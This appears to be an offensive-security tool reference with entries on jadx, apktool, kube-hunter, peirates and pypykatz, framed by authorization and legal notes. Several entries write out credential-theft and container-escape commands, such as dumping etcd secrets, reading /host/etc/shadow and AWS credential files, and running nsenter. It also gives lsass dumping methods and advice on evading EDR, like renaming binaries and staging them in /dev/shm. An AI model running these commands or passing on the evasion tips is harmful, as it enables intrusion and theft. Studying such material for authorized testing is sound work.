jadx.description: Dex-to-Java decompiler with GUI (jadx-gui) and CLI (jadx). Industry-standard for Android APK reverse engineering — pull APK from device, decompile to readable J
jadx.teach_intro: Most Android pentests start with 'pull the APK, jadx-gui, read the source'. jadx ships a clean Java decompilation that's far more readable than dex2jar's output. Searchable, navigable, with goto-definition. For hardened/obfuscated apps (ProGuard, DexGuard, R8), you'll see renamed classes (a.b.c) and need to cross-reference behavior dynamically with Frida. For dev-build APKs, you'll find AWS access keys, Firebase API keys, hardcoded JWT secrets in plain text.
opsec_notes: BEGINNER — jadx is a purely local, offline tool. It makes zero network connections during decompilation. The 'noise' it creates is entirely on the analyst's own machine: disk I/O from writing decompiled .java files, and CPU/memory spikes during dex translation. No packets leave your host. The risk is not detection-in-transit but rather what you do with the output afterward.

The artifact a defender (or forensic investigator) sees is the output directory jadx writes to disk. On Linux, jadx defaults to writing a folder named after the APK (e.g. 'com.target.app-sources/') in the current working directory. On Windows, this appears in %USERPROFILE% or wherever the shell was launched. These directories contain full reconstructed Java source trees — a clear indicator of reverse-engineering activity if the analyst machine is ever imaged or audited.

CUTTING-EDGE 2025-2026 — CrowdStrike Falcon and SentinelOne both instrument process creation events. If jadx-gui or the jadx CLI is launched from an unusual parent (e.g. spawned by a browser download handler, or from a pentest framework's shell), the parent-child process tree anomaly can trigger a behavioral detection on a managed endpoint. Run jadx from a dedicated, unmanaged analysis VM — never from a corporate laptop enrolled in an EDR tenant, even if you own the APK.

CUTTING-EDGE 2025-2026 — Microsoft Defender for Endpoint (MDE) on Windows 11 23H2+ applies command-line entropy scoring and file-write telemetry via ETW. Bulk Java file writes from a single process in a short window (jadx decompiling a large APK) can match heuristics for 'rapid file creation' used to detect ransomware staging. This is a false-positive risk for the analyst — MDE may quarantine the jadx binary or alert the SOC. Allowlist jadx explicitly in your analysis environment policy before running it.

If you extract secrets (API keys, JWT secrets, Firebase credentials) from decompiled source and then USE those credentials against a live backend, you have crossed from static analysis into active exploitation. That transition is where CFAA exposure begins — the decompilation itself is not the legal boundary, but the credential use is. Keep extracted secrets in your notes and do not test them against production systems without explicit written authorization.

ProGuard/R8/DexGuard obfuscation does not prevent jadx from decompiling — it prevents you from reading the output meaningfully. A common analyst mistake is to assume obfuscated output means 'nothing useful here' and stop. Obfuscated class names (a.b.c, a0.b1.c2) still reveal control flow, string literals, and API call patterns. Cross-reference with Frida runtime hooks to map obfuscated method names to behavior before concluding the app is hardened.

sample_outputs.scenario: Beginner — CTF Android challenge APK, no obfuscation, hunting for hardcoded secrets in a dev-build banking app
sample_outputs.explanation: jadx successfully decompiled the APK and wrote readable Java source to ./output_sources/. The grep reveals three files containing sensitive strings. BuildConfig.java — a class Android Studio auto-generates for every build — contains hardcoded AWS credentials and a Firebase API key that were accidentally committed in the debug build configuration. This is one of the most common critical findings in Android pentests. Next steps: (1) Use 'aws sts get-caller-identity' with the extracted key pair to determine what IAM role/user this key belongs to and whether it is still active. (2) Run 'aws iam list-attached-user-policies' to enumerate permissions. (3) Test the Firebase API key against the Firebase REST API to check for unauthenticated read/write on the Realtime Database. Do NOT test these credentials against production without written authorization — document the finding and report it.

sample_outputs.scenario: Advanced — Production app with R8/ProGuard obfuscation, hunting for OAuth client secrets and API endpoint structure to support a follow-on Frida instrumentation session
sample_outputs.explanation: The --deobf flags tell jadx to apply its built-in deobfuscation heuristics — renaming short identifiers based on usage patterns. It is imperfect (note the WARN lines for methods it could not fully reconstruct), but it surfaces enough structure to be actionable. Key findings: (1) A hardcoded OAuth client_secret for a production OAuth2 client — this can be used to request tokens directly via the client_credentials grant against the TOKEN_ENDPOINT without user interaction. (2) An undocumented /internal/admin/dashboard endpoint and a /internal/export/csv endpoint that are not in any public API documentation. (3) The WARN lines indicate methods using reflection or native JNI calls that jadx could not decompile — these are exactly the methods to hook with Frida next. Follow-on actions: (a) Use 'frida -U -f com.target.productionapp --no-pause -l hook_auth.js' to hook the refreshToken method at runtime and capture live tokens. (b) Feed the discovered endpoints into Burp Suite's target scope and replay authenticated requests with the extracted client credentials. (c) Run 'nuclei -u https://api.target-internal.com -t exposures/' against the base URL to check for additional unauthenticated exposure. All of this requires written authorization scoping the internal API domain.

legal_notes: US CFAA boundary — Decompiling an APK you lawfully possess (downloaded from the Play Store for a paid engagement, provided by the client, or a CTF artifact) is not a CFAA violation. The CFAA exposure begins the moment you use extracted credentials, tokens, or endpoint knowledge to access a computer system without authorization. Static analysis of the binary is not 'access' under 18 U.S.C. § 1030; authenticated API calls using extracted secrets are. Ensure your rules of engagement explicitly authorize testing the backend API, not just the mobile application binary.

Authorization scope — Your engagement scope document must explicitly name the mobile application package name (e.g. com.target.productionapp) AND the backend API domains it communicates with. Discovering an undocumented internal API endpoint (like /internal/admin/dashboard in the example above) does not automatically authorize you to probe it — you must confirm with the client that the internal API domain falls within scope before sending a single request. Get written confirmation before pivoting from static analysis to active API testing.

Modern cloud consideration — APKs frequently embed credentials for cloud services (AWS IAM keys, GCP service account JSON, Azure client secrets) that are governed by those cloud providers' terms of service independently of your client engagement. Even with client authorization to test the mobile app, using extracted AWS keys to enumerate IAM permissions touches AWS infrastructure. Confirm your engagement authorization explicitly covers cloud backend testing, and be aware that AWS CloudTrail will log every API call made with those keys — your test activity is permanently recorded in the client's audit log.
false_positives: jadx decompilation of heavily obfuscated apps (DexGuard, commercial obfuscators) will produce syntactically valid but semantically misleading Java. A method that appears to return a hardcoded string may actually be a decryption stub that computes the real value at runtime — the string you see in the source is the ciphertext, not the plaintext. Reporting a 'hardcoded secret' that is actually encrypted ciphertext is a false positive. Always validate string constants dynamically with Frida before including them in a report.

React Native, Flutter, and Xamarin APKs will decompile to nearly empty Java shells — the actual application logic lives in a bundled JavaScript file (index.android.bundle), a compiled Flutter engine binary (libflutter.so + app.so), or a Mono assembly (assemblies/*.dll) respectively. jadx will show you the thin Java wrapper but none of the business logic. Operators who stop at jadx output for these frameworks will miss 95% of the attack surface. For React Native, extract and beautify the JS bundle; for Flutter, use tools like blutter or reFlutter; for Xamarin, use dnSpy or ILSpy on the embedded DLLs.

ProGuard mapping files are sometimes accidentally shipped inside the APK itself (in assets/ or META-INF/). If present, jadx's --deobf mode will NOT automatically use them — you must manually apply the mapping file to restore original class and method names. Operators who run jadx without checking for a bundled mapping.txt will work with obfuscated names unnecessarily, potentially missing obvious vulnerability patterns that would be obvious with original names restored.

jadx's decompiler occasionally produces Java that does not accurately represent the original bytecode semantics, particularly around try-catch-finally blocks, switch statements on strings, and lambda expressions (invokedynamic). A code path that appears unreachable in jadx output may be reachable at runtime, and vice versa. Do not make definitive 'this code path is never executed' claims based solely on jadx output — confirm with Frida coverage tracing.

Multi-dex APKs (apps with more than 65,536 methods, requiring multiple .dex files) will sometimes have jadx fail silently on secondary dex files (classes2.dex, classes3.dex) if the APK is malformed or uses a non-standard packaging tool. The operator sees a complete-looking decompilation but is actually missing entire packages. Always verify the number of .dex files in the APK with 'unzip -l target.apk | grep \.dex' and confirm jadx processed all of them.

apktool.description: Reverse engineering tool for Android APKs. Decompiles to smali assembly (not Java), edits resources, rebuilds and re-signs. Different use case than jadx: apktoo
apktool.teach_intro: apktool d app.apk decompiles into smali (Dalvik bytecode assembly), AndroidManifest.xml in readable form, and all resources. Edit the smali (e.g., patch out a license check or a SSL-pin check), apktool b rebuilds, jarsigner re-signs, install — modified app runs. Smali is harder to read than decompiled Java but easier to patch precisely. Workflow: jadx to understand what to change, apktool + smali editor to actually change it.
opsec_notes: Beginner noise: apktool itself is a local Java tool — it makes NO network calls during decompile/rebuild. The noise is entirely on the device side: sideloading a repackaged APK requires 'Unknown Sources' or ADB install, both of which leave artifacts in Android's package manager logs and, on managed/MDM devices, trigger compliance alerts.

Every repackaged APK has a different certificate fingerprint than the original. Apps using Google Play Integrity API (formerly SafetyNet Attestation) or certificate pinning on their own signing cert will detect this immediately at runtime — the app may silently phone home, crash, or ban the account before you see any useful behavior.

Artifact defenders see: ADB installs via 'adb install -r patched.apk' generate a logcat entry tagged 'PackageManager' with the new cert SHA-256 and package name. On Android Enterprise / MDM-enrolled devices, this event is forwarded to the MDM console (Intune, Jamf, VMware Workspace ONE) within seconds. The log path on-device is /data/system/packages.xml — the cert digest is stored there permanently until uninstall.

2025-2026 cutting edge — Mobile EDR (CrowdStrike Falcon for Mobile, Microsoft Defender for Endpoint on Android): these agents perform runtime integrity checks comparing the installed APK's signing certificate against a known-good baseline pulled from Play Store metadata. A repackaged APK with a self-signed cert triggers a 'Tampered Application' alert with process tree context showing the offending package name and UID. This fires even if the app passes Play Integrity, because the EDR checks independently.

2025-2026 cutting edge — Some high-value apps (banking, enterprise SSO) now embed a secondary integrity check using Google Play Integrity API's STRONG_INTEGRITY verdict, which requires the device to be certified AND the APK to match Play Store distribution. Patching out the primary certificate pin does nothing if the app also calls the Integrity API — you must also patch or mock the Integrity API response, which requires a rooted device or a Frida hook, both of which are separately detectable.

Smali edits that change method signatures or class names can corrupt the dex checksum. apktool b recomputes it, but if you manually hex-edit classes.dex without rebuilding through apktool, the Dalvik/ART verifier will reject the APK at install time with 'INSTALL_FAILED_DEXOPT' — a clear indicator of tampering visible in logcat.

Next steps: (1) grep -r 'flag{' challenge_out/smali/ to hunt hardcoded strings, (2) cat challenge_out/AndroidManifest.xml to see declared activities, permissions, and exported components, (3) look in challenge_out/smali/com/challenge/MainActivity.smali for the license check logic.

sample_outputs.scenario: Advanced: Authorized mobile pentest — patch out SSL certificate pinning in a banking app's OkHttp network stack, rebuild, re-sign, and install for traffic interception via Burp Suite
sample_outputs.command: apktool d BankApp_v4.2.1.apk -o bankapp_out && grep -r 'CertificatePinner\|checkServerTrusted\|TrustManager' bankapp_out/smali/ -l
sample_outputs.output:

I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Baksmaling classes3.dex...
I: Copying assets and libs...

bankapp_out/smali_classes2/okhttp3/CertificatePinner.smali
bankapp_out/smali_classes2/com/bankapp/network/CustomTrustManager.smali
bankapp_out/smali_classes2/com/bankapp/network/PinningInterceptor.smali
sample_outputs.explanation: Three smali files are identified as containing pinning logic. The workflow from here: (1) Open CertificatePinner.smali — find the 'check' method (it throws an SSLPeerUnverifiedException on pin mismatch). Patch it by replacing the throw instruction with 'return-void' so it always passes. (2) In CustomTrustManager.smali, find 'checkServerTrusted' — if it throws, replace with return-void. (3) Rebuild: 'apktool b bankapp_out -o bankapp_patched.apk'. (4) Re-sign: 'keytool -genkey -v -keystore test.jks -alias test -keyalg RSA -keysize 2048 -validity 10000' then 'jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore test.jks bankapp_patched.apk test'. (5) Install: 'adb install -r bankapp_patched.apk'. (6) Route device traffic through Burp. If the app also calls Play Integrity API, you will need Frida + a Play Integrity spoof script (e.g., from the 'playintegrityfix' Magisk module ecosystem) running concurrently — apktool alone cannot mock runtime API responses. Also check AndroidManifest.xml for a 'network_security_config' reference: if present, the app has a declarative pin in res/xml/network_security_config.xml that you can simply delete or modify without touching smali at all — always check there first.

legal_notes: US CFAA boundary: Decompiling and repackaging an APK you do not own or have explicit written authorization to modify may violate 18 U.S.C. § 1030 if the modified app is used to access a computer system (including the app's backend API) in a manner that exceeds authorized access. The act of decompilation itself may also implicate the DMCA § 1201 anti-circumvention provisions if the APK uses technological protection measures — a narrow security research exemption exists (renewed in 2021 rulings) but requires good-faith research intent and responsible disclosure.

Engagement scope: Your rules of engagement must explicitly authorize mobile application testing AND specify whether you are permitted to install modified APKs on test devices, intercept TLS traffic, or access backend APIs with patched clients. 'Web application testing' scope does NOT automatically include the mobile client or its API endpoints — get explicit written sign-off. Confirm whether the client's MDM or Play Integrity backend will generate alerts that could be mistaken for a real incident.

Modern cloud/enterprise consideration: Enterprise apps distributed via managed Google Play or Apple Business Manager are often tied to device enrollment. Installing a repackaged APK on an enrolled device may trigger MDM compliance policy violations, remote wipe actions, or security incident tickets in the client's SIEM — coordinate with the client's IT/security team before testing on any MDM-enrolled device, even a dedicated test device, to avoid unintended operational impact.
false_positives: apktool will sometimes fail to fully decode resource tables from apps built with newer Android Gradle Plugin versions or apps that use resource obfuscation (e.g., via DexGuard or Guardsquare). The result is smali that references resource IDs like '0x7f0b0042' instead of human-readable names — the smali is still patchable, but you cannot grep for string names. Always check res/values/strings.xml; if it's full of hex IDs instead of strings, the resource table decode failed partially.

Multidex apps split classes across classes.dex, classes2.dex, classes3.dex etc. apktool puts these in smali/, smali_classes2/, smali_classes3/ respectively. Operators who only grep smali/ will miss code in the other directories — a common miss when hunting for pinning logic or license checks that live in a library dex.

apktool b (rebuild) will silently succeed even if your smali edits introduced a syntax error in some cases — the error only surfaces at ADB install time as 'INSTALL_FAILED_DEXOPT' or at runtime as a VerifyError crash. Always test the rebuilt APK on an emulator before assuming the patch worked.

Some apps use native libraries (.so files in lib/) for security-critical logic including certificate pinning and license validation. apktool decodes the Java/smali layer only — native code is not disassembled. If you patch all the smali pinning code and the app still rejects your proxy cert, the pin is enforced in a native library and requires Ghidra/IDA + Frida to address. apktool output gives no indication that native pinning exists.

Re-signed APKs cannot be installed as updates over the original Play Store version because Android enforces cert consistency for package upgrades. You must fully uninstall the original app first ('adb uninstall com.target.app'), which destroys any local app data (session tokens, cached credentials) you might have wanted to preserve. Plan for this before patching.

kubehunter.description: Kubernetes-specific vulnerability scanner. Probes for exposed kubelet endpoints, dashboard auth bypasses, etcd exposure, anonymous API server access. Aquasec pr
kubehunter.teach_intro: Kubernetes attack surface is huge: kubelet (port 10250) often anonymous, etcd (2379) sometimes unauthenticated, kubernetes-dashboard (8001) sometimes proxied without auth, kube-apiserver (6443) with permissive RBAC. kube-hunter probes all of these with --remote target_ip or --cidr 10.0.0.0/24. Outputs a vulnerability list with CVE references and remediation pointers. Followup with peirates or kubeletctl for actual exploitation; kube-hunter is recon only.
opsec_notes: BEGINNER NOISE: kube-hunter generates direct TCP connection attempts to ports 10250 (kubelet), 2379 (etcd), 8001 (dashboard), and 6443 (API server) from your source IP. Every connection attempt lands in cloud provider VPC flow logs, kube-apiserver audit logs (policy.k8s.io/v1beta1 audit events), and any network-level IDS watching east-west traffic. Your IP is burned the moment the first probe fires.

CONCRETE ARTIFACT — kube-apiserver audit log: anonymous probes against the API server generate audit events with 'user.username: system:anonymous' and 'responseStatus.code: 401 or 403' in /var/log/kubernetes/audit.log (or cloud-provider equivalents like CloudTrail for EKS). A defender watching for bursts of 401s from a single external IP will see you immediately.

CONCRETE ARTIFACT — kubelet access log: kubelet (port 10250) logs all HTTP requests to its local journal (journalctl -u kubelet). A GET /pods or GET /runningpods from an external IP with no corresponding service account token is a high-fidelity alert. Falco rule 'Unexpected K8s NodePort Connection' or custom Falco rule on kubelet_api_access will fire.

CUTTING-EDGE 2025: Cloud-native CNAPP platforms (Prisma Cloud, Wiz, Lacework) instrument the Kubernetes audit log stream in near-real-time and correlate anonymous API server access with network flow anomalies. In EKS environments, GuardDuty Kubernetes Protection (enabled by default in many orgs post-2023) has a dedicated finding type 'Policy:Kubernetes/AnonymousAccessGranted' and 'Discovery:Kubernetes/SuccessfulAnonymousAccess' — kube-hunter's anonymous probes trigger these within seconds.

CUTTING-EDGE 2025-2026: SentinelOne Singularity Cloud and CrowdStrike Falcon Cloud Security both ingest Kubernetes audit logs and apply behavioral ML. The pattern of sequential port probes (6443 → 10250 → 2379 → 8001) from a single source within a short window is a known kube-hunter signature. Some orgs have custom SIEM correlation rules specifically for this tool's probe sequence. Randomizing probe order or spacing probes across a longer time window reduces but does not eliminate detection.

EVASION CONSIDERATION: Running kube-hunter in --pod mode (from inside a pod) rather than --remote mode shifts the source of probes to an internal pod IP, which blends better with legitimate east-west traffic. However, the pod's service account token is logged in audit events, and any RBAC anomaly (a pod making API calls it has never made before) is flagged by behavioral baselines in modern CNAPPs. Internal probing is quieter but not silent.

sample_outputs.scenario: Beginner: single exposed node in a CTF/lab environment, default remote scan against a known IP, hunting for anonymous kubelet and API server access
sample_outputs.explanation: KHV002 means the kube-apiserver is accepting requests from unauthenticated clients (system:anonymous) — this is a critical misconfiguration. KHV005 means the kubelet's read-only or full API is accessible without a client certificate. For a beginner: these two findings together mean you can list all pods, exec into containers, and potentially read secrets without any credentials. Next steps: (1) Use 'kubeletctl pods --server 10.10.20.50' to list running pods via the unauthenticated kubelet API. (2) Use 'kubectl --server https://10.10.20.50:6443 --insecure-skip-tls-verify get pods --all-namespaces' to enumerate workloads anonymously. (3) Check if anonymous access includes exec rights: 'kubectl --server https://10.10.20.50:6443 --insecure-skip-tls-verify auth can-i create pods --as=system:anonymous'.

sample_outputs.scenario: Advanced: CIDR sweep of a cloud-hosted K8s cluster subnet during an authorized red-team engagement, hunting for etcd exposure and dashboard bypass across multiple nodes
sample_outputs.explanation: This output is a high-value recon result for an advanced operator. KHV031 (unauthenticated etcd on 2379) is the crown jewel: etcd stores all cluster state including Kubernetes Secrets in base64 — not encrypted at rest unless explicitly configured. Next steps: (1) Use 'etcdctl --endpoints=http://172.16.40.10:2379 get / --prefix --keys-only' to enumerate all keys, then 'etcdctl get /registry/secrets --prefix' to dump secrets. (2) Extract service account tokens from etcd: look for keys under /registry/secrets/kube-system/ — these often include tokens for cluster-admin-bound service accounts. (3) For the unauthenticated kubelets on .21 and .22, use 'kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --namespace kube-system --pod <pod-name> --container <container-name> --server 172.16.40.21' to extract a high-privilege token from a privileged pod. (4) KHV014 (dashboard on 8001) — check if the dashboard is running with '--enable-skip-login' or bound to a cluster-admin service account; if so, it's a GUI path to full cluster compromise. Follow up with peirates for automated post-exploitation and amicontained to assess container escape potential from any exec'd shell.

legal_notes: CFAA (18 U.S.C. § 1030): Scanning a Kubernetes cluster you do not own or have explicit written authorization to test constitutes unauthorized access to a protected computer. Cloud-hosted clusters (EKS, AKS, GKE) are operated by the cloud provider on behalf of the customer — your authorization must come from the cluster owner, not just the cloud account holder. Probing a shared-tenant environment (e.g., a managed K8s service used by multiple teams) without per-tenant authorization may expose you to liability even if you have credentials to the cloud account.

RULES OF ENGAGEMENT — CIDR SCOPE: The --cidr flag will probe every IP in the specified range. Before running a CIDR sweep, confirm with the client that ALL IPs in that range are in scope. In cloud environments, a /24 may include IPs belonging to other tenants, load balancers, or managed services not owned by your client. Explicitly list authorized IP ranges in your statement of work and cross-reference before running.

CLOUD-SPECIFIC: In AWS EKS environments, kube-hunter probes against the API server endpoint (which is often public-facing) will generate CloudTrail events under 'eks.amazonaws.com' and may trigger GuardDuty findings that are visible to the customer's security team in real time. Coordinate with the client's SOC before running to avoid triggering an incident response that terminates your engagement. In GKE, the same applies to Cloud Audit Logs under 'container.googleapis.com'.
false_positives: NETWORK POLICY MASKING REAL EXPOSURE: kube-hunter may report a service as 'not vulnerable' because a network policy or cloud security group blocks its probe from the external source IP. The kubelet or etcd endpoint may still be reachable from within the cluster (east-west) or from a specific CIDR that includes compromised nodes. A clean kube-hunter report from outside does not mean the cluster is secure from an insider or post-initial-access perspective.

ETCD TLS WITHOUT AUTH REPORTED AS SAFE: If etcd is configured with TLS but without client certificate authentication (--client-cert-auth=false), kube-hunter may fail to connect cleanly over plain HTTP and report the endpoint as 'not accessible' rather than 'unauthenticated TLS'. Manually verify with 'curl -k https://target:2379/v2/keys' — a 200 response with data means unauthenticated access is possible despite kube-hunter's miss.

KUBELET READ-ONLY PORT CONFUSION: kube-hunter probes port 10250 (full kubelet API, requires client cert by default) and sometimes port 10255 (read-only, no auth, deprecated in newer K8s). In clusters running K8s 1.26+, port 10255 is disabled by default, but kube-hunter may still probe it and report 'no vulnerability' on 10250 even when the read-only port is open on 10255 under a non-standard port configured by the operator.

DASHBOARD VERSION DETECTION UNRELIABLE: KHV014 (dashboard exposed) is triggered by port reachability and basic HTTP response, not by actual authentication bypass verification. A dashboard that is reachable but properly configured with RBAC and requiring a valid token will still trigger KHV014. Always manually browse to the dashboard endpoint and attempt the skip-login button or token submission before treating this as a confirmed bypass.

CLOUD LOAD BALANCER TERMINATION: In EKS/AKS/GKE clusters where the API server sits behind a cloud load balancer with WAF or IP allowlisting, kube-hunter may receive TCP RST or timeout responses and report the API server as 'not found' even though it is fully exposed to authorized CIDRs. The tool has no mechanism to distinguish 'filtered by firewall' from 'not running' — always cross-reference with cloud console or nmap -sV before concluding a service is absent.

peirates.description: Kubernetes penetration tool. Post-compromise: when you have shell on a container in a K8s pod, peirates exfiltrates service account tokens, enumerates cluster p
peirates.teach_intro: Once you've popped a container (SSRF to localhost:80, RCE in a webapp), peirates becomes the post-exploitation Swiss army knife. Reads /var/run/secrets/kubernetes.io/serviceaccount/token, queries the apiserver with that token to enumerate what the SA can do, then offers menu options: dump all secrets, create privileged pod for breakout, run kube-exec on other pods. Loud — every API call is logged in K8s audit logs if enabled.
opsec_notes: BEGINNER NOISE: Every peirates action that touches the Kubernetes API server generates an entry in the K8s audit log (typically at /var/log/kubernetes/audit.log or forwarded to a SIEM via Falco/Datadog). Even a single token validation call appears as a 'get' verb against the 'tokenreviews' resource from an unexpected source IP — defenders watching for pod-to-apiserver calls from non-controller namespaces will see this immediately.

CONCRETE ARTIFACT: The service account token read from /var/run/secrets/kubernetes.io/serviceaccount/token is not itself logged, but the FIRST API call peirates makes with that token produces an audit event with 'user.username: system:serviceaccount:<namespace>:<sa-name>' and 'sourceIPs' set to the pod's cluster IP. If that SA has never called the apiserver before, this is a high-fidelity anomaly. Defenders using Falco rule 'k8s_serviceaccount_token_accessed' will alert on the file read itself.

CUTTING-EDGE 2025-2026 — Falco + eBPF Runtime Detection: Modern K8s security stacks (Sysdig Secure, Aqua, Lacework) deploy eBPF-based runtime sensors that instrument syscalls at the kernel level inside the container. peirates reading /var/run/secrets/kubernetes.io/serviceaccount/token triggers an 'open' syscall on a sensitive path — Falco's default ruleset (FALCO_RULES_VERSION >= 0.36) fires 'Read sensitive file untrusted' with container.id, proc.name, and proc.cmdline attached. This telemetry is shipped to the SIEM within seconds, not minutes.

CUTTING-EDGE 2025-2026 — CrowdStrike Falcon for Containers: Falcon's container sensor (deployed as a DaemonSet or via eBPF in agentless mode on EKS/AKS/GKE) scores process tree anomalies. A Go binary (peirates is compiled Go) spawning inside a container that normally runs nginx or a JVM, then making outbound HTTPS to the cluster's internal apiserver endpoint (typically 10.96.0.1:443 or 172.20.0.1:443), produces a high-entropy process-tree alert. The parent-child chain (container entrypoint -> peirates) with no matching image layer provenance is flagged as 'Suspicious Process' in the Falcon console.

STEALTH CONSIDERATION — Minimize API Surface: peirates's menu-driven approach tempts operators to enumerate everything. Each 'list secrets', 'list pods', 'list namespaces' call is a separate audit log entry. Prefer manually crafting targeted kubectl or curl calls against the apiserver using the stolen token — same capability, far fewer log lines, and no peirates binary on disk. If you must use peirates, stage it in /dev/shm or /tmp with a renamed binary (e.g., 'kube-health-check') to avoid filename-based detections.

STEALTH CONSIDERATION — Privileged Pod Creation Timing: The most dangerous peirates action (creating a privileged pod that mounts the host filesystem for node breakout) is also the loudest. It generates a 'create pods' audit event, triggers admission controller webhooks (OPA/Gatekeeper, Kyverno), and if PodSecurityAdmission is enforced at 'restricted' or 'baseline', the pod creation will be denied and logged. Check PSA enforcement level first: 'kubectl get ns <namespace> -o jsonpath={.metadata.labels}' — if 'pod-security.kubernetes.io/enforce: restricted' is present, privileged pod breakout via peirates will fail loudly.

sample_outputs.explanation: This output represents full cluster compromise. Key findings: (1) 'cluster-admin' binding on a monitoring SA is the classic Prometheus/Grafana misconfiguration — operators should flag this in every K8s engagement. (2) 'etcd-certs' in kube-system containing server.key is catastrophic — etcd holds the entire cluster state including all secrets unencrypted; with the etcd server key an attacker can query etcd directly and bypass K8s RBAC entirely. (3) The github-deploy-key enables supply chain pivot — push malicious code to repos this key has write access to. (4) The privileged pod breakout succeeded, giving host filesystem access at /host — from here: read /host/etc/shadow for node credentials, read /host/var/lib/kubelet/pods/ for other pod secrets cached on disk, or install a persistent backdoor on the node itself. Next-step tools: (a) Use 'nsenter --target 1 --mount --uts --ipc --net --pid -- bash' from inside the privileged pod to fully escape into the host PID namespace — this is a complete container escape. (b) Run 'cat /host/root/.aws/credentials' and 'cat /host/root/.kube/config' for additional credential material. (c) Use Pacu or the AWS CLI with the harvested keys to enumerate the AWS account — check for IAM privilege escalation paths, S3 buckets, and SSM-managed instances. (d) Use BloodHound's AzureHound if the cluster is AKS with managed identity — the node's IMDS endpoint at 169.254.169.254 may return an Azure managed identity token with subscription-level permissions.

legal_notes: CFAA BOUNDARY: Accessing a Kubernetes API server with a stolen service account token — even one found inside a container you legitimately compromised during a pentest — constitutes 'exceeding authorized access' under 18 U.S.C. § 1030(a)(2) if your rules of engagement do not explicitly authorize post-exploitation enumeration of the cluster. Many scoped web-app assessments authorize testing the application only; using peirates to pivot into cluster infrastructure, dump secrets from other namespaces, or create pods on nodes outside the application's scope is out-of-bounds and potentially criminal even if you had initial authorization.

RULES OF ENGAGEMENT — SCOPE CREEP RISK: peirates's cluster-admin enumeration will surface secrets, credentials, and infrastructure belonging to OTHER tenants or teams sharing the cluster. Before running any cross-namespace enumeration, confirm your ROE explicitly covers: (a) all namespaces in the cluster, (b) cloud credentials that may be stored as K8s secrets, and (c) node-level access if you pursue a privileged pod breakout. 'We authorized you to test the prod namespace' does NOT cover reading kube-system secrets or breaking out to the underlying EC2/VM node.

CLOUD CONSIDERATION — IMDS AND MANAGED IDENTITY: In managed K8s environments (EKS, AKS, GKE), a successful node breakout via peirates gives access to the instance metadata service (IMDS) at 169.254.169.254. On EKS, this may return IAM role credentials for the node's EC2 instance profile. On AKS, it may return an Azure managed identity token. Using these credentials to access cloud APIs (S3, Azure Resource Manager, GCP APIs) is a separate legal and authorization question from the K8s engagement — cloud provider ToS violations and CFAA exposure apply independently of your pentest contract.
false_positives: PERMISSION CHECK INACCURACY — SelfSubjectAccessReview vs. Reality: peirates checks permissions by calling the SelfSubjectAccessReview API, which asks the apiserver 'can this SA do X?' However, if the cluster uses a non-standard admission controller or a webhook-based authorization mode (e.g., OPA/Gatekeeper with custom policies), the SelfSubjectAccessReview may return 'YES' for an action that the webhook will actually block at runtime. Operators have been burned assuming they can create pods based on peirates's permission check, only to have the actual pod creation denied by a Kyverno policy that wasn't reflected in RBAC.

NAMESPACE SCOPE CONFUSION: peirates's secret enumeration defaults to the current namespace unless explicitly told otherwise. If you run it without --all-namespaces, you may see only a subset of secrets and incorrectly conclude the SA has limited access. Always verify the ClusterRoleBinding vs. RoleBinding distinction manually: a ClusterRoleBinding grants cluster-wide access; a RoleBinding is namespace-scoped. peirates's output doesn't always make this distinction visually obvious.

STALE TOKEN ASSUMPTION: The service account token at /var/run/secrets/kubernetes.io/serviceaccount/token is auto-rotated by the kubelet in clusters running K8s >= 1.21 with BoundServiceAccountTokenVolume enabled (default since 1.22). Tokens expire after 1 hour by default. If peirates reads the token and then the operator pauses before using it, the token may have rotated and subsequent API calls will return 401 Unauthorized — peirates will report this as a connectivity failure rather than a token expiry, which can mislead the operator into thinking the apiserver is unreachable.

PRIVILEGED POD BREAKOUT FAILURE ON PSA-ENFORCED CLUSTERS: On clusters with PodSecurityAdmission enforced at 'baseline' or 'restricted' (default in K8s >= 1.25 for new namespaces), peirates's privileged pod creation will be silently denied or return a 403. The tool may report 'pod created' based on the API response before admission controllers run, then show the pod in 'Pending' or immediately 'Failed' state. Operators who don't check pod status will incorrectly believe the breakout succeeded.

ETCD CERT MISIDENTIFICATION: When peirates dumps secrets from kube-system and finds a secret named 'etcd-certs' or similar, the contents are not always the etcd server's TLS key — they may be the client certificates used by the apiserver to authenticate TO etcd, which have different (and sometimes more limited) utility. Verify the certificate's CN and usage fields with 'openssl x509 -in cert.pem -noout -text' before assuming you have direct etcd access.

pypykatz.description: Pure Python re-implementation of mimikatz. Parses lsass.exe memory dumps to extract credentials (NTLM hashes, plaintext passwords, Kerberos tickets, DPAPI maste
pypykatz.teach_intro: Modern EDR catches mimikatz.exe on disk and in memory via signature and behavioral detection. pypykatz's killer feature: you grab the lsass dump however you want (procdump.exe, comsvcs.dll MiniDump export via rundll32, Task Manager right-click) and parse it offline on the operator box. No malicious binary ever touches the target. SkelSec's project — same author wrote impacket-friendly equivalents (kerberoast-py, msldap, aiosmb).
opsec_notes: Beginner noise: pypykatz itself is silent on the network — it runs entirely offline on the operator box. The loud part is HOW you got the lsass dump. Task Manager right-click 'Create dump file' writes to C:\Users\<user>\AppData\Local\Temp\lsass.DMP — that path and filename are flagged by virtually every EDR on default policy.

The lsass dump creation event is the primary detection surface, not pypykatz parsing. Windows Security EID 10 (process access to lsass.exe) fires whenever any process opens lsass with PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS. Sysmon EID 10 captures the same with GrantedAccess field — defenders filter on GrantedAccess values 0x1010, 0x1410, 0x143A as high-confidence lsass dump indicators.

CrowdStrike Falcon and SentinelOne both use kernel-level callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks) to intercept lsass handle acquisition since Win11 22H2. Even 'legitimate' dump tools like procdump.exe are now blocked by Falcon's 'Credential Dumping' prevention policy by default — the binary hash AND the behavior pattern (process opening lsass + MiniDump API call) are both flagged. Comsvcs.dll MiniDump via rundll32 is similarly detected via ETW-TI telemetry on the MiniDumpWriteDump call.

Defender for Endpoint (MDE) generates alert 'Credential dumping via Windows Task Manager' specifically for the Task Manager dump path. It also detects comsvcs.dll abuse via process tree anomaly: rundll32.exe spawned with 'MiniDump' in the command line is a high-fidelity rule in MDE's built-in detection library. The artifact written to disk (the .dmp file) is also scanned by AMSI on some configurations.

